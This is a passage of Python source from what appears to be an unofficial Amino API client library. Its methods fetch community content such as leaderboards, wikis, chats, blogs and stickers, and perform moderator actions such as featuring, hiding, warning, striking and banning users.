        if "24" in type or "hour" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=1&start={start}&size={size}", headers=self.additional_headers())
        elif "7" in type or "day" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=2&start={start}&size={size}", headers=self.additional_headers())
        elif "rep" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=3&start={start}&size={size}", headers=self.additional_headers())
        elif "check" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=4", headers=self.additional_headers())
        elif "quiz" in type: response = self.session.get(f"/g/s-x{self.comId}/community/leaderboard?rankingType=5&start={start}&size={size}", headers=self.additional_headers())
        else: raise exceptions.WrongType(type)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def get_wiki_info(self, wikiId: str):
        """
        Get all things about wiki post.

        Accepting:
        - wikiId: str

        Recieving:
        - object `GetWikiInfo`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/item/{wikiId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.GetWikiInfo(response.json()).GetWikiInfo

    def get_recent_wiki_items(self, start: int = 0, size: int = 25):
        """
        Get all recent wiki items.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `WikiList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/item?type=catalog-all&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.WikiList(response.json()["itemList"]).WikiList

    def get_wiki_categories(self, start: int = 0, size: int = 25):
        """
        Get all wiki categories.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `WikiCategoryList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/item-category?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.WikiCategoryList(response.json()["itemCategoryList"]).WikiCategoryList

    def get_wiki_category(self, categoryId: str, start: int = 0, size: int = 25):
        """
        Get all wiki from category.

        Accepting:
        - categoryId: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `WikiCategory`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/item-category/{categoryId}?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.WikiCategory(response.json()).WikiCategory

    def get_tipped_users(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, chatId: str = None, start: int = 0, size: int = 25):
        """
        Get all users who tipped on your posting.

        Accepting:
        - blogId: str
        - wikiId: str
        - quizId: str
        - fileId: str
        - chatId: str
            - can be only one field
            - blogId -> quizId -> wikiId -> chatId -> fileId
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `TippedUsersSummary`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if blogId or quizId:
            if quizId is not None: blogId = quizId
            response = self.session.get(f"/x{self.comId}/s/blog/{blogId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
        elif wikiId: response = self.session.get(f"/x{self.comId}/s/item/{wikiId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
        elif chatId: response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
        elif fileId: response = self.session.get(f"/x{self.comId}/s/shared-folder/files/{fileId}/tipping/tipped-users-summary?start={start}&size={size}", headers=self.additional_headers())
        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.TippedUsersSummary(response.json()).TippedUsersSummary

    def get_chat_threads(self, start: int = 0, size: int = 25):
        """
        List of Chats the account is in.

        **Parameters**
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread?type=joined-me&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.ThreadList(response.json()["threadList"]).ThreadList

    def get_public_chat_threads(self, type: str = "recommended", start: int = 0, size: int = 25):
        """
        List of Public Chats of the Community.

        **Parameters**
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`Chat List <amino.lib.util.objects.ThreadList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread?type=public-all&filterType={type}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.ThreadList(response.json()["threadList"]).ThreadList

    def get_chat_thread(self, chatId: str):
        """
        Get the Chat Object from an Chat ID.

        **Parameters**
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : :meth:`Chat Object <amino.lib.util.objects.Thread>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.Thread(response.json()["thread"]).Thread

    def get_chat_messages(self, chatId: str, size: int = 25, pageToken: str = None):
        """
        List of Messages from an Chat.

        **Parameters**
            - **chatId** : ID of the Chat.
            - *size* : Size of the list.
            - *pageToken* : Next Page Token.

        **Returns**
            - **Success** : :meth:`Message List <amino.lib.util.objects.MessageList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """

        if pageToken is not None: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
        else: url = f"/x{self.comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"

        response = self.session.get(url, headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.GetMessages(response.json()).GetMessages

    def get_message_info(self, chatId: str, messageId: str):
        """
        Information of an Message from an Chat.

        **Parameters**
            - **chatId** : ID of the Chat.
            - **message** : ID of the Message.

        **Returns**
            - **Success** : :meth:`Message Object <amino.lib.util.objects.Message>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.Message(response.json()["message"]).Message

    def get_blog_info(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None):
        """
        Get all info about posting.

        Accepting:
        - blogId: str
        - wikiId: str
        - quizId: str
        - fileId: str
            - can be only one field
            - blogId -> quizId -> wikiId -> fileId

        Recieving:
        - object `GetBlogInfo`/`GetWikiInfo`/`SharedFolderFile`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if blogId or quizId:
            if quizId is not None: blogId = quizId
            response = self.session.get(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers())
            if response.status_code != 200: 
                return exceptions.CheckException(response)
            else: return objects.GetBlogInfo(response.json()).GetBlogInfo

        elif wikiId:
            response = self.session.get(f"/x{self.comId}/s/item/{wikiId}", headers=self.additional_headers())
            if response.status_code != 200: 
                return exceptions.CheckException(response)
            else: return objects.GetWikiInfo(response.json()).GetWikiInfo

        elif fileId:
            response = self.session.get(f"/x{self.comId}/s/shared-folder/files/{fileId}", headers=self.additional_headers())
            if response.status_code != 200: 
                return exceptions.CheckException(response)
            else: return objects.SharedFolderFile(response.json()["file"]).SharedFolderFile

        else: raise exceptions.SpecifyType()

    def get_blog_comments(self, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, sorting: str = "newest", start: int = 0, size: int = 25):
        """
        Get all blog comments.

        Accepting:
        - blogId: str
        - wikiId: str
        - quizId: str
        - fileId: str
            - can be only one field
            - blogId -> quizId -> wikiId -> fileId
        - sorting: str = "newest"
            - can be only "newest", "oldest" or "top"/"vote"
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `CommentList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if sorting == "newest": sorting = "newest"
        elif sorting == "oldest": sorting = "oldest"
        elif sorting in ["vote", "top"]: sorting = "vote"

        if blogId or quizId:
            if quizId is not None: blogId = quizId
            response = self.session.get(f"/x{self.comId}/s/blog/{blogId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
        elif wikiId: response = self.session.get(f"/x{self.comId}/s/item/{wikiId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
        elif fileId: response = self.session.get(f"/x{self.comId}/s/shared-folder/files/{fileId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
        else: raise exceptions.SpecifyType()

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.CommentList(response.json()["commentList"]).CommentList

    def get_blog_categories(self, size: int = 25):
        """
        Get all possible blog categories.

        Accepting:
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogCategoryList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog-category?size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogCategoryList(response.json()["blogCategoryList"]).BlogCategoryList

    def get_blogs_by_category(self, categoryId: str, start: int = 0, size: int = 25):
        """
        Get all possible blogs in category.

        Accepting:
        - categoryId: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog-category/{categoryId}/blog-list?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def get_quiz_rankings(self, quizId: str, start: int = 0, size: int = 25):
        """
        Get quiz winners.

        Accepting:
        - quizId: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `QuizRankings`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog/{quizId}/quiz/result?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.QuizRankings(response.json()).QuizRankings

    def get_wall_comments(self, userId: str, sorting: str, start: int = 0, size: int = 25):
        """
        List of Wall Comments of an User.

        **Parameters**
            - **userId** : ID of the User.
            - **sorting** : Order of the Comments.
                - ``newest``, ``oldest``, ``top``
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`Comments List <amino.lib.util.objects.CommentList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if sorting == "newest": sorting = "newest"
        elif sorting == "oldest": sorting = "oldest"
        elif sorting == "top": sorting = "vote"
        else: raise exceptions.WrongType(sorting)

        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.CommentList(response.json()["commentList"]).CommentList

    def get_recent_blogs(self, pageToken: str = None, start: int = 0, size: int = 25):
        """
        Get recent blogs.

        Accepting:
        - pageToken: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `RecentBlogs`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if pageToken is not None: url = f"/x{self.comId}/s/feed/blog-all?pagingType=t&pageToken={pageToken}&size={size}"
        else: url = f"/x{self.comId}/s/feed/blog-all?pagingType=t&start={start}&size={size}"

        response = self.session.get(url, headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.RecentBlogs(response.json()).RecentBlogs

    def get_chat_users(self, chatId: str, start: int = 0, size: int = 25):
        """
        Getting users in chat.

        Accepting:
        - chatId: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `UserProfileList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/member?start={start}&size={size}&type=default&cv=1.2", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["memberList"]).UserProfileList

    def get_notifications(self, start: int = 0, size: int = 25):
        """
        Getting notifications in community.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `NotificationList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/notification?pagingType=t&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.NotificationList(response.json()["notificationList"]).NotificationList

    def get_notices(self, start: int = 0, size: int = 25):
        """
        Getting notices in community.

        Notices are NOT notifications. Its like "you are in read only mode", "you got strike", "you got warning", "somebody wants to promote you to curator/leader/curator".

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `NoticeList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/notice?type=usersV2&status=1&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.NoticeList(response.json()["noticeList"]).NoticeList

    def get_sticker_pack_info(self, sticker_pack_id: str):
        """
        Getting all info about sticker pack.

        Accepting:
        - sticker_pack_id: str

        Recieving:
        - object `StickerCollection`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/sticker-collection/{sticker_pack_id}?includeStickers=true", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection

    def get_sticker_packs(self):
        """
        Getting sticker pack.

        Accepting:
        - sticker_pack_id: str

        Recieving:
        - object `StickerCollection`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/sticker-collection?includeStickers=false&type=my-active-collection", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection

    # TODO : Finish this
    def get_store_chat_bubbles(self, start: int = 0, size: int = 25):
        """
        Getting all available chat bubbles from store.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `dict`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/store/items?sectionGroupId=chat-bubble&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else:
            response = response.json()
            del response["api:message"], response["api:statuscode"], response["api:duration"], response["api:timestamp"]
            return response

    # TODO : Finish this
    def get_store_stickers(self, start: int = 0, size: int = 25):
        """
        Getting all available stickers from store.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `dict`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/store/items?sectionGroupId=sticker&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else:
            response = response.json()
            del response["api:message"], response["api:statuscode"], response["api:duration"], response["api:timestamp"]
            return response

    def get_community_stickers(self):
        """
        Getting all available stickers in community.

        Recieving:
        - object `CommunityStickerCollection`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/sticker-collection?type=community-shared", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.CommunityStickerCollection(response.json()).CommunityStickerCollection

    def get_sticker_collection(self, collectionId: str):
        """
        Getting all available info about sticker pack.

        Accepting:
        - collectionId: str

        Recieving:
        - object `StickerCollection`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/sticker-collection/{collectionId}?includeStickers=true", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.StickerCollection(response.json()["stickerCollection"]).StickerCollection

    def get_shared_folder_info(self):
        """
        Getting all available info about shared folder.

        Recieving:
        - object `GetSharedFolderInfo`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/shared-folder/stats", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.GetSharedFolderInfo(response.json()["stats"]).GetSharedFolderInfo

    def get_shared_folder_files(self, type: str = "latest", start: int = 0, size: int = 25):
        """
        Getting all available files in shared folder.

        Accepting:
        - type: str = "latest"
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `SharedFolderFileList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/shared-folder/files?type={type}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.SharedFolderFileList(response.json()["fileList"]).SharedFolderFileList

    #
    # MODERATION MENU
    #

    def moderation_history(self, userId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, size: int = 25):
        """
        Getting moderation history of object.

        Accepting:
        - userId: str = None
        - blogId: str = None
        - wikiId: str = None
        - quizId: str = None
        - fileId: str = None
            - can be only one field
            - userId -> blogId -> quizId -> wikiId -> fileId
            - if all fields are None, getting all latest operations in "shared" moderation history
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `AdminLogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """

        if userId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={userId}&objectType=0&pagingType=t&size={size}", headers=self.additional_headers())
        elif blogId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={blogId}&objectType=1&pagingType=t&size={size}", headers=self.additional_headers())
        elif quizId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={quizId}&objectType=1&pagingType=t&size={size}", headers=self.additional_headers())
        elif wikiId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={wikiId}&objectType=2&pagingType=t&size={size}", headers=self.additional_headers())
        elif fileId: response = self.session.get(f"/x{self.comId}/s/admin/operation?objectId={fileId}&objectType=109&pagingType=t&size={size}", headers=self.additional_headers())
        else: response = self.session.get(f"/x{self.comId}/s/admin/operation?pagingType=t&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.AdminLogList(response.json()["adminLogList"]).AdminLogList

    def feature(
            self,
            time: int | objects.PostFeatureDays | objects.ChatFeatureDays | objects.UserFeatureDays,
            userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None
        ):
        """
        Feature object.

        Accepting:
        - time: int
            - it can be int, but better if it will be enum
        - userId: str = None
        - blogId: str = None
        - wikiId: str = None
        - quizId: str = None
            - can be only one field
            - userId -> blogId -> wikiId -> fileId

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if chatId:
            if isinstance(time, int):
                if time == 1: inttime = 3600
                elif time == 2: inttime = 7200
                elif time == 3: inttime = 10800
                else: raise exceptions.WrongType(time)
            else:
                try: inttime = time.value
                except: raise exceptions.WrongType(time)

        else:
            if isinstance(time, int):
                if time == 1: inttime = 86400
                elif time == 2: inttime = 172800
                elif time == 3: inttime = 259200
                else: raise exceptions.WrongType(time)
            else:
                try: inttime = time.value
                except: raise exceptions.WrongType(time)

        data = {
            "adminOpName": 114,
            "adminOpValue": {
                "featuredDuration": inttime
            },
            "timestamp": inttime()
        }

        if userId:
            data["adminOpValue"] = {"featuredType": 4}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["adminOpValue"] = {"featuredType": 1}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/admin", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["adminOpValue"] = {"featuredType": 1}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/admin", headers=self.additional_headers(data=data), data=data)

        elif chatId:
            data["adminOpValue"] = {"featuredType": 5}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/admin", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def unfeature(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None):
        """
        Unfeature object.

        Accepting:
        - userId: str = None
        - blogId: str = None
        - wikiId: str = None
        - quizId: str = None
            - can be only one field
            - userId -> blogId -> wikiId -> fileId

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = {
            "adminOpName": 114,
            "adminOpValue": {},
            "timestamp": inttime()
        }

        if userId:
            data["adminOpValue"] = {"featuredType": 0}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["adminOpValue"] = {"featuredType": 0}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/admin", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["adminOpValue"] = {"featuredType": 0}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/admin", headers=self.additional_headers(data=data), data=data)

        elif chatId:
            data["adminOpValue"] = {"featuredType": 0}
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/admin", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def hide(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, reason: str = None):
        """
        Hide object.

        Accepting:
        - userId: str = None
        - blogId: str = None
        - wikiId: str = None
        - quizId: str = None
        - fileId: str = None
            - can be only one field
            - userId -> blogId -> quizId -> wikiId -> fileId
        - reason: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = {
            "adminOpNote": {
                "content": reason or "[empty reason]"
            },
            "timestamp": inttime()
        }

        if userId:
            data["adminOpName"] = 18
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 9
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/admin", headers=self.additional_headers(data=data), data=data)

        elif quizId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 9
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/admin", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 9
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/admin", headers=self.additional_headers(data=data), data=data)

        elif chatId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 9
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/admin", headers=self.additional_headers(data=data), data=data)

        elif fileId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 9
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/shared-folder/files/{fileId}/admin", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def unhide(self, userId: str = None, chatId: str = None, blogId: str = None, wikiId: str = None, quizId: str = None, fileId: str = None, reason: str = None):
        """
        Unhide object.

        Accepting:
        - userId: str = None
        - blogId: str = None
        - wikiId: str = None
        - quizId: str = None
        - fileId: str = None
            - can be only one field
            - userId -> blogId -> quizId -> wikiId -> fileId
        - reason: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        
        data = {
            "adminOpNote": {
                "content": reason
            },
            "timestamp": inttime()
        }

        if userId:
            data["adminOpName"] = 19
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 0
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/admin", headers=self.additional_headers(data=data), data=data)

        elif quizId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 0
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/admin", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 0
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/admin", headers=self.additional_headers(data=data), data=data)

        elif chatId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 0
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/admin", headers=self.additional_headers(data=data), data=data)

        elif fileId:
            data["adminOpName"] = 110
            data["adminOpValue"] = 0
            data = dumps(data)
            response = self.session.post(f"/x{self.comId}/s/shared-folder/files/{fileId}/admin", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def edit_titles(self, userId: str, titles: list, colors: list):
        """
        Edit user's titles.

        Accepting:
        - userId: str
        - titles: list
        - colors: list

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        
        tlt = []
        for titles, colors in zip(titles, colors):
            tlt.append({"title": titles, "color": colors})

        data = dumps({
            "adminOpName": 207,
            "adminOpValue": {
                "titles": tlt
            },
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def edit_titles_as_dict(self, userId: str, titles: dict):
        """
        Edit user's titles.
        Example:

        `subclient.edit_titles_as_dict(userId, {"toxic": "#00FF00"})`

        Accepting:
        - userId: str
        - titles: dict

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        
        tlt = []
        for title, color in titles.items():
            tlt.append({"title": title, "color": color})

        data = dumps({
            "adminOpName": 207,
            "adminOpValue": {
                "titles": tlt
            },
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/admin", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    # TODO : List all warning texts
    def warn(self, userId: str, reason: str = None):
        """
        Give a warn to user.

        Accepting:
        - userId: str
        - reason: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """

        data = dumps({
            "uid": userId,
            "title": "Custom",
            "content": reason or "You recieved this warning because of... something. Admin just used amino.fix.fix library to give you a warning and didn't set a reason.",
            "attachedObject": {
                "objectId": userId,
                "objectType": 0
            },
            "penaltyType": 0,
            "adminOpNote": {},
            "noticeType": 7,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/notice", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    # TODO : List all strike texts
    def strike(self, userId: str, time: int, title: str = None, reason: str = None):
        """
        Give a strike (warn + read only mode) to user.

        Accepting:
        - userId: str
        - time: int
            - time == 1 is 1 hour
            - time == 2 is 4 hours
            - time == 3 is 8 hours
            - time == 4 is 12 hours
            - time == 5 is 24 hours
            - time == 6 is 72 hours (visually, its 24 hours)
        - title: str = None
        - reason: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """

        if time == 1: time = 3600
        elif time == 2: time = 10800
        elif time == 3: time = 21600
        elif time == 4: time = 43200
        elif time == 5: time = 86400
        elif time == 6: time = 259200
        else: raise exceptions.WrongType(time)

        data = dumps({
            "uid": userId,
            "title": title or "You got striked by Knife of Justice!",
            "content": reason or "You got striked by Knife of Justice by this admin! Sadly, there is no reason. Admin thought that amino.fix.fix will forgive this, hehe. :з",
            "attachedObject": {
                "objectId": userId,
                "objectType": 0
            },
            "penaltyType": 1,
            "penaltyValue": time,
            "adminOpNote": {},
            "noticeType": 4,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/notice", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def ban(self, userId: str, reason: str = None, banType: int = None):
        """
        Ban user.

        Accepting:
        - userId: str
        - reason: str = None
        - banType: int = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "reasonType": banType,
            "note": {
                "content": reason or "No reason provided. (Amino.fix.fix will NOT allow fully empty ban reasons. It's not fair.)"
            },
            "timestamp": inttime()
        })
